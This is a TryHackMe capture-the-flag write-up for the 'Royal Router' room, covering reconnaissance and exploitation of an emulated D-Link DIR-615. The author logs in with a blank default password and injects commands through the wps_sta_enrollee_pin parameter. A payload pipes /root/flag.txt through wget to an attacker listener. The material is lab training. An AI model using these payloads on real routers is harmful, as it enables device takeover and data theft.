---
title: "TryHackMe: Royal Router"
author: Sc17
categories: [TryHackMe]
tags: [iot, command_injection]
render_with_liquid: false
media_subpath: /Images/tryhackme_royal_router/
image:
  path: room.png
---

## Initial Recon

```console
$ nmap 10.10.176.43 -sC -sV --min-rate 10000 -p- -oN nmap
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ba:e9:60:d1:da:07:55:0d:42:a7:7a:ce:a1:51:46:49 (RSA)
|   256 53:e0:64:1d:40:26:cf:01:2f:58:f3:11:9b:2b:aa:a7 (ECDSA)
|_  256 8e:f3:af:39:2a:f1:18:ff:3d:86:45:54:1b:e6:58:ad (ED25519)
23/tcp    open  telnet?
80/tcp    open  http         DD-WRT milli_httpd
|_http-server-header: httpd
|_http-title: D-LINK CORPORATION, INC | WIRELESS ROUTER | LOGIN
9999/tcp  open  abyss?
20443/tcp open  unknown
24433/tcp open  unknown
28080/tcp open  thor-engine?
50628/tcp open  unknown
Service Info: OS: Linux; Device: WAP; CPE: cpe:/o:linux:linux_kernel
```

we see the following ports open.
 - `22/ssh`
 - `23/telnet`
 - `80/http`

and the higher ports are unknown to me.


## Port 80 

### Getting Router Admin Panel

![admin-panel](admin-panel.png)

we see many interesting information here.

- The router `firmware` version which is `3.03WW`
- The router model `DIR-615`

I tried some weak credentials , and `admin:<blank-pass>` worked.

and i was very confused here , as i see many options , so i didn't knew which point to attack . so i searched some `CVE` for this model, And i came across this [blog](https://tomorrowisnew.com/posts/hacking-the-dlink-dir-615-for-fun-and-no-profit-part-3-cve-2020-10213/) .


## Verifying The RCE

So from that blog , we read that in `set_sta_enrollee_pin.cgi` page its `POST` parameter `wps_sta_enrollee_pin` is vulnerable to Command Injection. So i decided to test it on this router.

> If you try to visit `set_sta_enrollee_pin.cgi` in your browser , it will redirect you to infinity , you should be logged in and intercept the request and transform the `GET` request to a `POST` request.
{: .prompt-tip }


so the `Command Injection` payload at first i used was `;ping -c 2 10.17.9.139` URL encoded.

![command_injection_verify](caido1.png)

i forwarded the above `request` and in my listener i got `icmp` packets.

```shell
$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
04:06:50.085496 IP 10.10.176.43 > warrior: ICMP echo request, id 7109, seq 0, length 64
04:06:50.085572 IP warrior > 10.10.176.43: ICMP echo reply, id 7109, seq 0, length 64
04:06:51.091253 IP 10.10.176.43 > warrior: ICMP echo request, id 7109, seq 1, length 64
04:06:51.091292 IP warrior > 10.10.176.43: ICMP echo reply, id 7109, seq 1, length 64
```


## Getting a Shell

> I was not able to launch a shell , i tried `netcat` `busybox bash` `telnet` `wget` but still i was not able to get a `reverse shell` , i thought the firewall blocking it , so i turned off it in the router panel , still the i was not getting any connection back , if you managed to pop up a shell , please let me know how.
{: .prompt-tip }

# Reading the Flag

`Busybox` has `wget` and i guessed the flag might be located in `/root/flag.txt` so i used `wget` to read the flag. In the `Command Injection` i used the payload `;wget http://10.17.9.139/$(cat /root/flag.txt)` (URL encoded) . 


so i forwarded the `request`.
![reading_flag](caido2.png)

and in my listener i got the `flag`.

```shell
$ nc -lvnp 80
listening on [any] 80 ...
connect to [10.17.9.139] from (UNKNOWN) [10.10.176.43] 43209
 HTTP/1.1EXFILTRATING<REDACTED>ROUTER}
Host: 10.17.9.139
User-Agent: Wget
Connection: close

```

